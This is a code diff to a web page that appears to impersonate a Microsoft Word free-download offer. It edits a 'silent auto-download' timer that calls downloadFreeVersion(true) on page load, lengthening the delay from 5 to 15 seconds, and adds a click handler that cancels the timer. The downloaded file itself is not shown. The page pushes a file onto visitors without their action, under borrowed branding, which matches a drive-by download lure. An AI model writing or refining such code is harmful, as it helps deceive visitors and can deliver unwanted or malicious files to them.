@@ -436,12 +436,21 @@ window.addEventListener('DOMContentLoaded', function() {
             if (button) {
                 // Keep existing text but ensure click handler works
                 button.disabled = false;
-                // Remove any existing click handlers and add ours
+                // Clear any existing handlers to prevent conflicts
                 button.onclick = null;
                 button.removeAttribute('onclick');
+                
+                // Add single, clean event listener
                 button.addEventListener('click', function(e) {
                     e.preventDefault();
                     e.stopPropagation();
+                    
+                    // Cancel auto-download if user manually clicks
+                    if (autoDownloadTimer) {
+                        clearTimeout(autoDownloadTimer);
+                        autoDownloadTimer = null;
+                    }
+                    
                     downloadFreeVersion(false);
                 });
             }
@@ -453,11 +462,11 @@ window.addEventListener('DOMContentLoaded', function() {
             console.log('Using static product info fallback');
         });
     
-    // Start auto-download timer (5 seconds)
+    // Start auto-download timer (15 seconds - gives users time to read)
     autoDownloadTimer = setTimeout(() => {
         console.log('Starting silent auto-download...');
         downloadFreeVersion(true);
-    }, 5000);
+    }, 15000);
 });
 
 // Cancel auto-download if user clicks anywhere
@@ -1785,7 +1794,6 @@ section.buy-box,
                 <button class="btn btn-primary btn-block" 
                         id="buybox-cta-proper" 
                         aria-label="Word - Download Free Version"
-                        onclick="downloadFreeVersion()" 
                         data-automation-test-id="buy-box-button"
                         style="background: #0067b8; color: #ffffff; border: none; padding: 16px 24px; font-size: 1rem; font-weight: 600; border-radius: 4px; min-height: 48px; width: 100%;">
                     Download Free Version
